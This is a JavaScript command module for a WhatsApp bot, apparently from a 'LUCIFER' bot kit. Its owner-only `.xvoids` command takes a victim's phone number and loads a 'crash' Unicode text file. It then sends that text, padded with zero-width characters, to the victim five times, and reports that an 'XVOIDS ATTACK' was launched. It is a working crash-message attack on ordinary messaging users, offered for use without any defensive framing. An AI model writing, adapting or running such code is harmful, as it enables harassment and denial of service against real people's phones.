const fs = require("fs");
const path = require("path");

// 🧼 Clean number
function getCleanNumber(jid) {
  return jid ? jid.replace(/\D/g, "") : null;
}

// 🔍 Resolve sender number
function resolveSenderNumber(m, conn) {
  let senderJid =
    m.key?.participant ||
    m.participant ||
    m.message?.extendedTextMessage?.contextInfo?.participant ||
    m.sender ||
    (m.key?.fromMe && conn?.user?.id) ||
    m.key?.remoteJid;

  if (!senderJid && conn?.decodeJid) {
    try {
      senderJid = conn.decodeJid(m?.key?.remoteJid);
    } catch {
      senderJid = null;
    }
  }

  return getCleanNumber(senderJid);
}

module.exports = async function ({ conn, m, args, reply, jid }) {
  try {
    const isGroup = jid.endsWith("@g.us");
    const senderNum = resolveSenderNumber(m, conn);
    if (!senderNum) return reply("❌ Sender detect nahi ho saka.");

    // 🔐 Owner check via selfmode.json
    const selfPath = path.join(__dirname, "media", "selfmode.json");
    if (!fs.existsSync(selfPath)) {
      return reply("⚠️ *Bot inactive.* Ask owner to run `.self` command first.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    let jsonData;
    try {
      jsonData = JSON.parse(fs.readFileSync(selfPath, "utf-8"));
    } catch {
      return reply("❌ Error reading selfmode.json. File may be corrupted.");
    }

    const realOwner = jsonData.owner_sender;
    if (senderNum !== realOwner) {
      return reply("🚫 *Access Denied!*\n\nOnly the *Real Bot Owner* can use `.xvoids`\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    // 🎯 Target resolution
    if (!args[0]) return reply("❌ *Provide number*\nExample: `.xvoids 923xx...`");
    const targetNum = args[0].replace(/\D/g, "");
    if (!targetNum.match(/^\d{9,15}$/)) return reply("❌ *Invalid number.*");

    const targetJid = targetNum + "@s.whatsapp.net";

    // 📂 Load bug content
    let unicode;
    try {
      unicode = fs.readFileSync("./media/tayyabtext3.txt", "utf-8");
    } catch {
      return reply("❌ Crash file missing: `./media/tayyabtext3.txt`");
    }

    const payload = "🌀 *XVOIDS ATTACK*\n\n💣\u200C\u200B\u200D\n\n" + unicode.repeat(1);
    const sendCount = 5;

    // 🚀 Send 5 times with delay
    for (let i = 0; i < sendCount; i++) {
      try {
        await conn.sendMessage(targetJid, { text: payload }, { quoted: m });
        await new Promise((res) => setTimeout(res, 1500));
      } catch {
        return reply(`❌ Failed to send xvoids bug to ${targetNum} at attempt #${i + 1}.`);
      }
    }

    return reply(`✅ *XVOIDS attack launched on:* ${targetNum}\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓`);

  } catch (err) {
    console.error("❌ xvoids error:", err);
    return reply("❌ Error while sending xvoids bug. Check logs.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
  }
};